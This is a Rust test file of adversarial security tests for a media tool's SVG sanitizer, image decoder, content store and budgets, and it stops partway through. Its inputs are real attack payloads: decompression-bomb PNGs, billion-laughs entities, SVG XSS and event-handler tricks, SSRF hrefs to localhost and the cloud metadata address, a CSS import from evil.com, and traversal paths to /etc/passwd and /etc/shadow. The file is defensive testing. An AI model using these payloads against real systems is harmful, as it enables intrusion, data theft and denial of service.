// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! PARANOID security tests for media tools.
//!
//! These tests are ADVERSARIAL. They attempt to break the system through:
//! - Decompression bombs (crafted PNG headers)
//! - SVG attacks (XXE, SSRF, XSS, entity expansion)
//! - Path traversal (null bytes, Unicode, URL encoding)
//! - Resource exhaustion (budget overflow, memory bombing)
//! - Parameter injection (type confusion, boundary abuse)
//!
//! Every test asserts the specific NIKA error code expected.

#[cfg(test)]
mod tests {
    use std::sync::Arc;

    use crate::media::{CasStore, MediaBudget};
    use crate::runtime::builtin::media::context::{MediaToolContext, WorkingMemoryBudget};
    use crate::runtime::builtin::media::dimensions::DimensionsOp;
    use crate::runtime::builtin::media::safety::sanitize_svg;
    use crate::runtime::builtin::media::thumbhash_tool::ThumbhashOp;
    #[cfg(feature = "media-svg")]
    use crate::runtime::builtin::media::MediaOpResult;
    use crate::runtime::builtin::media::{MediaOp, MediaToolAdapter};
    use crate::runtime::builtin::BuiltinTool;
    use crate::runtime::media_context::EngineMediaContext;

    /// Helper: wrap a MediaToolContext in EngineMediaContext for tests.
    fn engine_ctx(ctx: std::sync::Arc<nika_media::tools::context::MediaToolContext>) -> std::sync::Arc<EngineMediaContext> {
        std::sync::Arc::new(EngineMediaContext::new(ctx))
    }

    async fn setup() -> (tempfile::TempDir, Arc<MediaToolContext>) {
        let dir = tempfile::tempdir().unwrap();
        let ctx = Arc::new(MediaToolContext::new(CasStore::new(dir.path())).unwrap());
        (dir, ctx)
    }

    /// Create a context with a custom tiny budget for exhaustion tests.
    fn setup_with_budget(dir: &std::path::Path, budget_bytes: u64) -> Arc<MediaToolContext> {
        Arc::new(MediaToolContext {
            cas: CasStore::new(dir),
            budget: Arc::new(MediaBudget::with_max_per_run(budget_bytes)),
            compute: Arc::new(crate::runtime::builtin::media::context::ComputePool::new().unwrap()),
            working_memory: Arc::new(WorkingMemoryBudget::new()),
            cancel: tokio_util::sync::CancellationToken::new(),
            working_dir: None,
        })
    }

    // ═══════════════════════════════════════════════════════════════════════
    // 1. DECOMPRESSION BOMBS
    // ═══════════════════════════════════════════════════════════════════════

    /// Craft a PNG whose IHDR claims 65535x65535 but has a tiny body.
    /// decode_image_safe MUST reject this via Limits (max dim = 10000).
    #[cfg(any(feature = "media-thumbnail", feature = "media-svg"))]
    #[test]
    fn bomb_png_65535x65535_ihdr_rejected_by_limits() {
        use crate::runtime::builtin::media::safety::decode_image_safe;

        // Build a minimal PNG with a fraudulent IHDR claiming 65535x65535
        let mut png = Vec::new();
        // PNG signature
        png.extend_from_slice(&[137, 80, 78, 71, 13, 10, 26, 10]);
        // IHDR: 65535x65535, 8-bit RGBA
        let ihdr_data: [u8; 13] = [
            0x00, 0x00, 0xFF, 0xFF, // width = 65535
            0x00, 0x00, 0xFF, 0xFF, // height = 65535
            8,    // bit depth
            6,    // color type RGBA
            0,    // compression
            0,    // filter
            0,    // interlace
        ];
        let ihdr_crc = png_crc(b"IHDR", &ihdr_data);
        png.extend_from_slice(&(13u32).to_be_bytes());
        png.extend_from_slice(b"IHDR");
        png.extend_from_slice(&ihdr_data);
        png.extend_from_slice(&ihdr_crc.to_be_bytes());
        // Minimal IDAT (will fail decompression, but limits should catch first)
        let fake_idat = vec![
            0x78, 0x01, 0x01, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x01,
        ];
        let idat_crc = png_crc(b"IDAT", &fake_idat);
        png.extend_from_slice(&(fake_idat.len() as u32).to_be_bytes());
        png.extend_from_slice(b"IDAT");
        png.extend_from_slice(&fake_idat);
        png.extend_from_slice(&idat_crc.to_be_bytes());
        // IEND
        let iend_crc = png_crc(b"IEND", &[]);
        png.extend_from_slice(&0u32.to_be_bytes());
        png.extend_from_slice(b"IEND");
        png.extend_from_slice(&iend_crc.to_be_bytes());

        let result = decode_image_safe(&png);
        assert!(result.is_err(), "65535x65535 PNG must be rejected");
        let err = result.unwrap_err();
        assert!(
            err.to_string().contains("NIKA-290"),
            "expected NIKA-290 (tool_error from decode), got: {err}"
        );
    }

    /// A PNG with valid 1x1 header but massively inflated IDAT data.
    /// The image crate should reject this via Limits::max_alloc (256 MB).
    #[cfg(any(feature = "media-thumbnail", feature = "media-svg"))]
    #[test]
    fn bomb_png_valid_header_massive_idat_rejected() {
        use crate::runtime::builtin::media::safety::decode_image_safe;

        // Build a PNG with 10000x10000 header (at the limit) but RGBA = 400MB decoded
        // 10000 * 10000 * 4 = 400,000,000 bytes > 256 MB limit
        let mut png = Vec::new();
        png.extend_from_slice(&[137, 80, 78, 71, 13, 10, 26, 10]);
        let ihdr_data: [u8; 13] = [
            0x00, 0x00, 0x27, 0x10, // width = 10000
            0x00, 0x00, 0x27, 0x10, // height = 10000
            8,    // bit depth
            6,    // color type RGBA (4 bytes/pixel)
            0, 0, 0,
        ];
        let ihdr_crc = png_crc(b"IHDR", &ihdr_data);
        png.extend_from_slice(&(13u32).to_be_bytes());
        png.extend_from_slice(b"IHDR");
        png.extend_from_slice(&ihdr_data);
        png.extend_from_slice(&ihdr_crc.to_be_bytes());
        // Minimal (invalid) IDAT - just enough to trigger dimension-based alloc rejection
        let fake_idat = vec![
            0x78, 0x01, 0x01, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x01,
        ];
        let idat_crc = png_crc(b"IDAT", &fake_idat);
        png.extend_from_slice(&(fake_idat.len() as u32).to_be_bytes());
        png.extend_from_slice(b"IDAT");
        png.extend_from_slice(&fake_idat);
        png.extend_from_slice(&idat_crc.to_be_bytes());
        let iend_crc = png_crc(b"IEND", &[]);
        png.extend_from_slice(&0u32.to_be_bytes());
        png.extend_from_slice(b"IEND");
        png.extend_from_slice(&iend_crc.to_be_bytes());

        let result = decode_image_safe(&png);
        assert!(
            result.is_err(),
            "10000x10000 RGBA PNG (400MB decoded) must be rejected"
        );
        let err = result.unwrap_err();
        assert!(
            err.to_string().contains("NIKA-290"),
            "expected NIKA-290 from decode_image_safe limits, got: {err}"
        );
    }

    /// decode_image_safe with an entirely empty buffer must not panic.
    #[cfg(any(feature = "media-thumbnail", feature = "media-svg"))]
    #[test]
    fn bomb_empty_data_no_panic() {
        use crate::runtime::builtin::media::safety::decode_image_safe;
        let result = decode_image_safe(&[]);
        assert!(result.is_err());
    }

    /// decode_image_safe with just a PNG signature and no chunks.
    #[cfg(any(feature = "media-thumbnail", feature = "media-svg"))]
    #[test]
    fn bomb_truncated_png_signature_only() {
        use crate::runtime::builtin::media::safety::decode_image_safe;
        let png_sig = [137, 80, 78, 71, 13, 10, 26, 10];
        let result = decode_image_safe(&png_sig);
        assert!(
            result.is_err(),
            "truncated PNG (signature only) must be rejected"
        );
    }

    /// A PNG with dimensions just at the limit (10000x1) should succeed
    /// if the allocation is under 256 MB.
    #[cfg(any(feature = "media-thumbnail", feature = "media-svg"))]
    #[test]
    fn bomb_png_at_dimension_limit_10000x1_accepted() {
        use crate::runtime::builtin::media::safety::decode_image_safe;
        // 10000x1 RGBA = 40,000 bytes -- well within limits
        let img = image::ImageBuffer::from_pixel(10_000, 1, image::Rgba([255u8, 0, 0, 255]));
        let mut buf = Vec::new();
        let enc = image::codecs::png::PngEncoder::new(&mut buf);
        image::ImageEncoder::write_image(
            enc,
            img.as_raw(),
            10_000,
            1,
            image::ExtendedColorType::Rgba8,
        )
        .unwrap();

        let result = decode_image_safe(&buf);
        assert!(result.is_ok(), "10000x1 should be within limits");
        let decoded = result.unwrap();
        assert_eq!(decoded.width(), 10_000);
        assert_eq!(decoded.height(), 1);
    }

    // ═══════════════════════════════════════════════════════════════════════
    // 2. SVG ATTACKS
    // ═══════════════════════════════════════════════════════════════════════

    /// Billion laughs / XML entity expansion attack.
    #[test]
    fn svg_attack_entity_expansion_billion_laughs() {
        // Classic XXE billion laughs adapted for SVG
        let svg = r#"<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY x0 "AAAAAAAAAA">
  <!ENTITY x1 "&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;">
  <!ENTITY x2 "&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;">
  <!ENTITY x3 "&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;">
  <!ENTITY x4 "&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&x4;</text>
</svg>"#;
        // Defense in depth: sanitizer now blocks DOCTYPE/ENTITY declarations
        // before they reach the usvg rendering layer.
        let result = sanitize_svg(svg);
        assert!(
            result.is_err(),
            "sanitizer should block DOCTYPE/ENTITY declarations"
        );
    }

    /// SSRF via xlink:href to localhost.
    #[test]
    fn svg_attack_ssrf_xlink_localhost() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg">
      <image xlink:href="http://localhost:8080/internal-api" width="10" height="10"/>
    </svg>"#;
        let result = sanitize_svg(svg);
        assert!(result.is_err(), "xlink:href SSRF must be blocked");
        assert!(
            result.unwrap_err().to_string().contains("NIKA-297"),
            "expected NIKA-297 for xlink SSRF"
        );
    }

    /// SSRF via xlink:href to 127.0.0.1.
    #[test]
    fn svg_attack_ssrf_xlink_loopback_ip() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg">
      <image xlink:href="http://127.0.0.1:9200/_cat/indices" width="10" height="10"/>
    </svg>"#;
        let result = sanitize_svg(svg);
        assert!(result.is_err(), "xlink:href to 127.0.0.1 must be blocked");
        assert!(result.unwrap_err().to_string().contains("NIKA-297"));
    }

    /// SSRF via xlink:href to internal metadata service.
    #[test]
    fn svg_attack_ssrf_xlink_cloud_metadata() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg">
      <image xlink:href="http://169.254.169.254/latest/meta-data/" width="10" height="10"/>
    </svg>"#;
        let result = sanitize_svg(svg);
        assert!(
            result.is_err(),
            "xlink:href to cloud metadata must be blocked"
        );
        assert!(result.unwrap_err().to_string().contains("NIKA-297"));
    }

    /// data: URI with embedded HTML to attempt XSS.
    #[test]
    fn svg_attack_data_uri_html_injection() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg">
      <image href="data:text/html,<script>alert('xss')</script>" width="10" height="10"/>
    </svg>"#;
        let result = sanitize_svg(svg);
        assert!(result.is_err(), "data:text/html must be blocked");
        assert!(result.unwrap_err().to_string().contains("NIKA-297"));
    }

    /// data: URI with base64-encoded HTML.
    #[test]
    fn svg_attack_data_uri_base64_html() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg">
      <image href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" width="10" height="10"/>
    </svg>"#;
        let result = sanitize_svg(svg);
        assert!(result.is_err(), "data:text/html;base64 must be blocked");
        assert!(result.unwrap_err().to_string().contains("NIKA-297"));
    }

    /// CSS @import with external URL -- could exfiltrate data.
    /// The sanitizer currently does not block this, but resources_dir=None
    /// in the SVG renderer prevents loading. We document the gap.
    #[test]
    fn svg_attack_css_import_external() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg">
      <style>@import url("https://evil.com/exfil.css");</style>
      <rect width="100" height="100"/>
    </svg>"#;
        // CSS @import is not blocked at text level — defense is
        // usvg::Options::resources_dir = None at render time.
        // Document the actual behavior so changes are detected.
        let result = sanitize_svg(svg);
        assert!(
            result.is_ok(),
            "CSS @import is allowed by sanitizer (renderer blocks loading)"
        );
    }

    /// Deeply nested SVG within SVG (stack exhaustion attempt).
    #[test]
    fn svg_attack_nested_svg_recursion() {
        // Build deeply nested SVGs
        let depth = 1000;
        let mut svg = String::new();
        for _ in 0..depth {
            svg.push_str(r#"<svg xmlns="http://www.w3.org/2000/svg">"#);
        }
        svg.push_str(r#"<rect width="10" height="10"/>"#);
        for _ in 0..depth {
            svg.push_str("</svg>");
        }
        // sanitize_svg should pass (no forbidden elements), but the parser
        // should not stack-overflow. We only check for no panic.
        let result = sanitize_svg(&svg);
        // No panic is the assertion -- the SVG is technically clean.
        assert!(
            result.is_ok(),
            "deeply nested SVG has no forbidden elements"
        );
    }

    /// SVG with enormous viewBox (100000x100000) -- should not cause allocation.
    #[cfg(feature = "media-svg")]
    #[tokio::test]
    async fn svg_attack_huge_viewbox_resource_limited() {
        let (_dir, ctx) = setup().await;
        // viewBox is huge but the sanitizer clamps w/h to 10000 in SvgRenderOp
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100000 100000">
      <rect width="100000" height="100000" fill="red"/>
    </svg>"#;
        let sr = ctx.cas.store(svg.as_bytes()).await.unwrap();

        let op = crate::runtime::builtin::media::svg::SvgRenderOp;
        // Without explicit width/height, SvgRenderOp uses the SVG's natural size
        // clamped to 10000. So 100000 gets clamped to 10000x10000.
        // 10000x10000x4 = 400MB -- might be rejected by pixmap allocation.
        // Either way, must not OOM or panic.
        let result = op.execute(serde_json::json!({"hash": sr.hash}), &ctx).await;
        // We accept either success (clamped) or error (resource limit), but never panic.
        match &result {
            Ok(MediaOpResult::Binary { .. }) => {
                // If it succeeds, the output dimensions should be clamped
                // (pixmap is max 10000x10000 by clamp)
            }
            Err(e) => {
                // An error is acceptable -- the important thing is no panic
                let msg = e.to_string();
                assert!(
                    msg.contains("NIKA-290") || msg.contains("NIKA-297"),
                    "expected NIKA-290 or NIKA-297, got: {msg}"
                );
            }
            _ => {}
        }
    }

    /// Mix of safe elements with one dangerous one -- must still be rejected.
    #[test]
    fn svg_attack_mixed_safe_and_dangerous() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
      <rect width="100" height="100" fill="blue"/>
      <circle cx="50" cy="50" r="40" fill="green"/>
      <text x="10" y="50">Hello</text>
      <path d="M 0 0 L 100 100" stroke="red"/>
      <script>alert('gotcha')</script>
      <ellipse cx="50" cy="50" rx="30" ry="20"/>
    </svg>"#;
        let result = sanitize_svg(svg);
        assert!(
            result.is_err(),
            "single dangerous element in otherwise safe SVG must be rejected"
        );
        assert!(result.unwrap_err().to_string().contains("NIKA-297"));
    }

    /// Event handler with whitespace obfuscation.
    #[test]
    fn svg_attack_event_handler_whitespace_obfuscation() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg">
      <rect onload  =  "alert(1)" width="10" height="10"/>
    </svg>"#;
        let result = sanitize_svg(svg);
        assert!(
            result.is_err(),
            "event handler with extra whitespace must be caught"
        );
        assert!(result.unwrap_err().to_string().contains("NIKA-297"));
    }

    /// Event handler with tab character.
    #[test]
    fn svg_attack_event_handler_tab_separated() {
        let svg = "<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <rect onload\t=\"alert(1)\" width=\"10\" height=\"10\"/>\n</svg>";
        let result = sanitize_svg(svg);
        assert!(
            result.is_err(),
            "event handler with tab separator must be caught"
        );
        assert!(result.unwrap_err().to_string().contains("NIKA-297"));
    }

    /// javascript: with mixed case to bypass naive check.
    #[test]
    fn svg_attack_javascript_mixed_case() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg">
      <a href="JaVaScRiPt:alert(1)"><text>click</text></a>
    </svg>"#;
        let result = sanitize_svg(svg);
        assert!(
            result.is_err(),
            "javascript: with mixed case must be caught"
        );
        assert!(result.unwrap_err().to_string().contains("NIKA-297"));
    }

    /// file:// protocol with mixed case.
    #[test]
    fn svg_attack_file_protocol_mixed_case() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg">
      <image href="FILE:///etc/shadow" width="10" height="10"/>
    </svg>"#;
        let result = sanitize_svg(svg);
        assert!(result.is_err(), "file:// with mixed case must be caught");
        assert!(result.unwrap_err().to_string().contains("NIKA-297"));
    }

    /// foreignObject with mixed case.
    #[test]
    fn svg_attack_foreign_object_mixed_case() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg">
      <FOREIGNOBJECT width="100" height="100">
        <body xmlns="http://www.w3.org/1999/xhtml"><div>pwned</div></body>
      </FOREIGNOBJECT>
    </svg>"#;
        let result = sanitize_svg(svg);
        assert!(
            result.is_err(),
            "FOREIGNOBJECT must be caught case-insensitively"
        );
        assert!(result.unwrap_err().to_string().contains("NIKA-297"));
    }

    /// SVG that is actually a polyglot HTML/SVG.
    #[test]
    fn svg_attack_polyglot_html_svg() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg">
      <foreignObject>
        <body xmlns="http://www.w3.org/1999/xhtml">
          <img src=x onerror="alert(1)">
        </body>
      </foreignObject>
    </svg>"#;
        let result = sanitize_svg(svg);
        assert!(result.is_err(), "polyglot HTML/SVG must be rejected");
        assert!(result.unwrap_err().to_string().contains("NIKA-297"));
    }

    /// Multiple forbidden patterns in one SVG.
    #[test]
    fn svg_attack_multiple_forbidden_patterns() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
      <script>document.cookie</script>
      <foreignObject><div>html</div></foreignObject>
      <a href="javascript:void(0)">link</a>
      <image xlink:href="file:///etc/passwd"/>
    </svg>"#;
        let result = sanitize_svg(svg);
        assert!(
            result.is_err(),
            "SVG with multiple attacks must be rejected"
        );
        assert!(result.unwrap_err().to_string().contains("NIKA-297"));
    }

    // ═══════════════════════════════════════════════════════════════════════
    // 3. PATH TRAVERSAL
    // ═══════════════════════════════════════════════════════════════════════

    /// Hash containing ../ sequences must not escape CAS root.
    #[tokio::test]
    async fn path_traversal_dotdot_in_hash() {
        let dir = tempfile::tempdir().unwrap();
        let store = CasStore::new(dir.path());

        let traversal_hashes = vec![
            "blake3:../../etc/passwd",
            "blake3:../../../etc/shadow",
            "../../etc/passwd",
            "blake3:aa/../../../etc/passwd",
            "blake3:aa/../../bb",
        ];

        for hash in traversal_hashes {
            let result = store.read(hash).await;
            assert!(
                result.is_err(),
                "path traversal hash '{}' must be rejected",
                hash
            );
            let err_msg = result.unwrap_err().to_string();
            assert!(
                err_msg.contains("NIKA-253"),
                "expected NIKA-253 for path traversal '{}', got: {err_msg}",
                hash
            );
        }
    }

    /// Hash containing null bytes -- could truncate paths in C-backed syscalls.
    #[tokio::test]
    async fn path_traversal_null_bytes_in_hash() {
        let dir = tempfile::tempdir().unwrap();
        let store = CasStore::new(dir.path());

        let result = store.read("blake3:abcdef\0../../etc/passwd").await;
        assert!(result.is_err(), "null byte in hash must be rejected");
        assert!(
            result.unwrap_err().to_string().contains("NIKA-253"),
            "expected NIKA-253 for null byte hash"
        );
    }

    /// Hash with URL-encoded path traversal (%2e%2e%2f).
    #[tokio::test]
    async fn path_traversal_url_encoded() {
        let dir = tempfile::tempdir().unwrap();
        let store = CasStore::new(dir.path());

        let hashes = vec![
            "blake3:%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "blake3:..%2f..%2fetc%2fpasswd",
            "blake3:%2e%2e/%2e%2e/etc/passwd",
        ];

        for hash in hashes {
            let result = store.read(hash).await;
            assert!(
                result.is_err(),
                "URL-encoded traversal '{}' must be rejected",
                hash
            );
            // The hex validator rejects % since it's not a hex digit
            assert!(result.unwrap_err().to_string().contains("NIKA-253"));
        }
    }

    /// Hash with Unicode normalization attacks (fullwidth dots and slashes).
    #[tokio::test]
    async fn path_traversal_unicode_normalization() {
        let dir = tempfile::tempdir().unwrap();
        let store = CasStore::new(dir.path());

        let hashes = vec![
            // Fullwidth period U+FF0E and fullwidth solidus U+FF0F
            "blake3:\u{FF0E}\u{FF0E}\u{FF0F}etc\u{FF0F}passwd",
            // Combining dot above
            "blake3:a\u{0307}\u{0307}/etc/passwd",
            // Halfwidth forms
            "blake3:\u{FF0E}\u{FF0E}/\u{FF0E}\u{FF0E}/etc/passwd",
        ];

        for hash in hashes {
            let result = store.read(hash).await;
            assert!(
                result.is_err(),
                "Unicode normalization attack '{}' must be rejected",
                hash
            );
            assert!(result.unwrap_err().to_string().contains("NIKA-253"));
        }
    }

    /// Hash with backslash path separator (Windows-style traversal).
    #[tokio::test]
    async fn path_traversal_backslash() {
        let dir = tempfile::tempdir().unwrap();
        let store = CasStore::new(dir.path());

        let result = store.read(r"blake3:..\..\etc\passwd").await;
        assert!(result.is_err(), "backslash traversal must be rejected");
        assert!(result.unwrap_err().to_string().contains("NIKA-253"));
    }

    /// Hash that is exactly 2 chars (minimum for shard) but with non-hex chars.
    #[tokio::test]
    async fn path_traversal_short_non_hex_hash() {
        let dir = tempfile::tempdir().unwrap();
        let store = CasStore::new(dir.path());

        let result = store.read("blake3:zz").await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("NIKA-253"));
    }

    /// CAS store path never escapes root, even with adversarial data content.
    #[tokio::test]
    async fn path_traversal_adversarial_data_content() {
        let dir = tempfile::tempdir().unwrap();
        let store = CasStore::new(dir.path());

        // Store data whose content looks like a path traversal
        let evil_data = b"../../../../etc/passwd";
        let result = store.store(evil_data).await.unwrap();

        // The hash is computed from content, so the path is safe
        let canonical_root = dir.path().canonicalize().unwrap();
        let canonical_path = result.path.canonicalize().unwrap();
        assert!(
            canonical_path.starts_with(&canonical_root),
            "CAS path must stay within root"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // 4. RESOURCE EXHAUSTION
    // ═══════════════════════════════════════════════════════════════════════

    /// Submit 100 concurrent tool operations -- none should panic.
    #[tokio::test]
    async fn exhaustion_100_concurrent_operations() {
        let (_dir, ctx) = setup().await;
        let ctx = Arc::clone(&ctx);

        // Store a valid small image
        let img = image::ImageBuffer::from_pixel(10, 10, image::Rgba([255u8, 0, 0, 255]));
        let mut buf = Vec::new();
        let enc = image::codecs::png::PngEncoder::new(&mut buf);
        image::ImageEncoder::write_image(
            enc,
            img.as_raw(),
            10,
            10,
            image::ExtendedColorType::Rgba8,
        )
        .unwrap();
        let sr = ctx.cas.store(&buf).await.unwrap();
        let hash = sr.hash.clone();

        let handles: Vec<_> = (0..100)
            .map(|_| {
                let ctx = Arc::clone(&ctx);
                let hash = hash.clone();
                tokio::spawn(async move {
                    let op = DimensionsOp;
                    op.execute(serde_json::json!({"hash": hash}), &ctx).await
                })
            })
            .collect();

        let results: Vec<_> = futures::future::join_all(handles).await;
        let success_count = results
            .iter()
            .filter(|r| r.as_ref().unwrap().is_ok())
            .count();
        assert_eq!(
            success_count, 100,
            "all 100 concurrent dimension reads should succeed"
        );
    }

    /// Fill CAS budget to exactly max, then attempt one more byte -- must reject.
    #[tokio::test]
    async fn exhaustion_budget_exactly_at_max_then_one_more() {
        let dir = tempfile::tempdir().unwrap();
        let budget_bytes = 1024u64;
        let ctx = setup_with_budget(dir.path(), budget_bytes);

        // Fill to exactly the limit
        let data = vec![0xAB_u8; budget_bytes as usize];
        let result = ctx.store_media(&data, "fill_budget").await;
        assert!(result.is_ok(), "storing exactly max budget should succeed");
        assert_eq!(ctx.budget.current_bytes(), budget_bytes);

        // Now try one more byte -- should fail
        let one_more = vec![0xCD_u8; 1];
        let result = ctx.store_media(&one_more, "one_more").await;
        assert!(result.is_err(), "one byte over budget must be rejected");
        let err = result.unwrap_err();
        assert!(
            err.to_string().contains("NIKA-259"),
            "expected NIKA-259 (RunBudgetExceeded), got: {err}"
        );

        // Budget should NOT have changed
        assert_eq!(ctx.budget.current_bytes(), budget_bytes);
    }

    /// Concurrent budget charges must not race past the limit.
    #[tokio::test]
    async fn exhaustion_budget_concurrent_race_condition() {
        let dir = tempfile::tempdir().unwrap();
        // Budget: 1000 bytes. 20 tasks each trying to store 100 bytes.
        // Total: 2000 bytes. Exactly 10 should succeed, 10 should fail.
        let ctx = setup_with_budget(dir.path(), 1000);

        let handles: Vec<_> = (0..20)
            .map(|i| {
                let ctx = Arc::clone(&ctx);
                tokio::spawn(async move {
                    let data = vec![i as u8; 100];
                    ctx.store_media(&data, &format!("task_{i}")).await
                })
            })
            .collect();

        let results: Vec<_> = futures::future::join_all(handles).await;
        let success_count = results
            .iter()
            .filter(|r| r.as_ref().unwrap().is_ok())
            .count();
        let fail_count = results
            .iter()
            .filter(|r| r.as_ref().unwrap().is_err())
            .count();

        assert_eq!(
            success_count, 10,
            "exactly 10 should fit in 1000-byte budget"
        );
        assert_eq!(fail_count, 10, "exactly 10 should be rejected");
        assert_eq!(
            ctx.budget.current_bytes(),
            1000,
            "budget should be exactly at max"
        );
    }

    /// WorkingMemoryBudget exhaustion with concurrent acquires.
    #[test]
    fn exhaustion_working_memory_concurrent_acquires() {
        let budget = WorkingMemoryBudget::with_max(1024);

        // Acquire chunks until exhausted
        let mut guards = Vec::new();
        for _ in 0..10 {
            match budget.acquire(100) {
                Ok(g) => guards.push(g),
                Err(_) => break,
            }
        }
        // 10 * 100 = 1000, should succeed. 11th would be 1100 > 1024.
        assert_eq!(
            guards.len(),
            10,
            "should fit 10 x 100 = 1000 in 1024 budget"
        );
        assert_eq!(budget.current(), 1000);

        // One more should fail
        let result = budget.acquire(100);
        assert!(result.is_err(), "working memory should be exhausted");
        assert!(
            result.unwrap_err().to_string().contains("NIKA-290"),
            "expected NIKA-290 from working memory exhaustion"
        );

        // Release all and verify recovery
        guards.clear();
        assert_eq!(budget.current(), 0, "all memory should be released");

        // Now acquire again -- should work
        let _g = budget.acquire(1024).unwrap();
        assert_eq!(budget.current(), 1024);
    }

    /// WorkingMemoryBudget: acquire exactly max, then try 1 more.
    #[test]
    fn exhaustion_working_memory_exact_then_one_more() {
        let budget = WorkingMemoryBudget::with_max(512);
        let _guard = budget.acquire(512).unwrap();
        assert_eq!(budget.current(), 512);

        let result = budget.acquire(1);
        assert!(
            result.is_err(),
            "1 byte over working memory limit must fail"
        );
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("working memory exhausted"));
    }

    /// WorkingMemoryBudget: zero-size acquire should succeed.
    #[test]
    fn exhaustion_working_memory_zero_acquire() {
        let budget = WorkingMemoryBudget::with_max(0);
        // Acquiring 0 bytes into a 0-max budget should succeed (0 + 0 = 0 <= 0)
        let result = budget.acquire(0);
        assert!(
            result.is_ok(),
            "zero-size acquire should succeed even with zero budget"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // 5. PARAMETER INJECTION
    // ═══════════════════════════════════════════════════════════════════════

    /// Width as negative number (via JSON).
    #[cfg(feature = "media-thumbnail")]
    #[tokio::test]
    async fn inject_thumbnail_negative_width() {
        let (_dir, ctx) = setup().await;
        let png = fixture_png_10x10();
        let sr = ctx.cas.store(&png).await.unwrap();

        let op = crate::runtime::builtin::media::thumbnail::ThumbnailOp;
        // -5 as JSON number -- as_u64() returns None for negative
        let result = op
            .execute(
                serde_json::json!({
                  "hash": sr.hash, "width": -5
                }),
                &ctx,
            )
            .await;
        assert!(result.is_err(), "negative width must be rejected");
        assert!(
            result.unwrap_err().to_string().contains("NIKA-294"),
            "expected NIKA-294 for negative width"
        );
    }

    /// Width as float.
    #[cfg(feature = "media-thumbnail")]
    #[tokio::test]
    async fn inject_thumbnail_float_width() {
        let (_dir, ctx) = setup().await;
        let png = fixture_png_10x10();
        let sr = ctx.cas.store(&png).await.unwrap();

        let op = crate::runtime::builtin::media::thumbnail::ThumbnailOp;
        // 2.5 as JSON float -- as_u64() returns None for floats
        let result = op
            .execute(
                serde_json::json!({
                  "hash": sr.hash, "width": 2.5
                }),
                &ctx,
            )
            .await;
        assert!(result.is_err(), "float width must be rejected");
        assert!(
            result.unwrap_err().to_string().contains("NIKA-294"),
            "expected NIKA-294 for float width"
        );
    }

    /// Width as string.
    #[cfg(feature = "media-thumbnail")]
    #[tokio::test]
    async fn inject_thumbnail_string_width() {
        let (_dir, ctx) = setup().await;
        let png = fixture_png_10x10();
        let sr = ctx.cas.store(&png).await.unwrap();

        let op = crate::runtime::builtin::media::thumbnail::ThumbnailOp;
        let result = op
            .execute(
                serde_json::json!({
                  "hash": sr.hash, "width": "one hundred"
                }),
                &ctx,
            )
            .await;
        assert!(result.is_err(), "string width must be rejected");
        assert!(
            result.unwrap_err().to_string().contains("NIKA-294"),
            "expected NIKA-294 for string width"
        );
    }

    /// Width = u64::MAX (overflow attempt).
    #[cfg(feature = "media-thumbnail")]
    #[tokio::test]
    async fn inject_thumbnail_max_u64_width() {
        let (_dir, ctx) = setup().await;
        let png = fixture_png_10x10();
        let sr = ctx.cas.store(&png).await.unwrap();

        let op = crate::runtime::builtin::media::thumbnail::ThumbnailOp;
        let result = op
            .execute(
                serde_json::json!({
                  "hash": sr.hash, "width": u64::MAX
                }),
                &ctx,
            )
            .await;
        assert!(result.is_err(), "u64::MAX width must be rejected");
        assert!(
            result.unwrap_err().to_string().contains("NIKA-294"),
            "expected NIKA-294 for u64::MAX width"
        );
    }

    /// Hash as empty string.
    #[tokio::test]
    async fn inject_dimensions_empty_hash() {
        let (_dir, ctx) = setup().await;
        let op = DimensionsOp;
        let result = op.execute(serde_json::json!({"hash": ""}), &ctx).await;
        assert!(result.is_err(), "empty hash must be rejected");
        // Empty hash is too short for CAS read -> NIKA-253
        assert!(
            result.unwrap_err().to_string().contains("NIKA-253"),
            "expected NIKA-253 for empty hash"
        );
    }

    /// Hash as a very long string (1 MB of hex chars).
    #[tokio::test]
    async fn inject_dimensions_very_long_hash() {
        let (_dir, ctx) = setup().await;
        let op = DimensionsOp;
        // 1 MB of 'a' characters (valid hex)
        let long_hash = format!("blake3:{}", "a".repeat(1_048_576));
        let result = op
            .execute(serde_json::json!({"hash": long_hash}), &ctx)
            .await;
        assert!(
            result.is_err(),
            "1MB hash must be rejected (file not found)"
        );
        // The hash passes hex validation but the file doesn't exist.
        // Could be NIKA-253 (NotFound) or NIKA-255 (I/O error if path too long for OS).
        let err_msg = result.unwrap_err().to_string();
        assert!(
            err_msg.contains("NIKA-253") || err_msg.contains("NIKA-255"),
            "expected NIKA-253 or NIKA-255, got: {err_msg}"
        );
    }

    /// Format parameter as path traversal string.
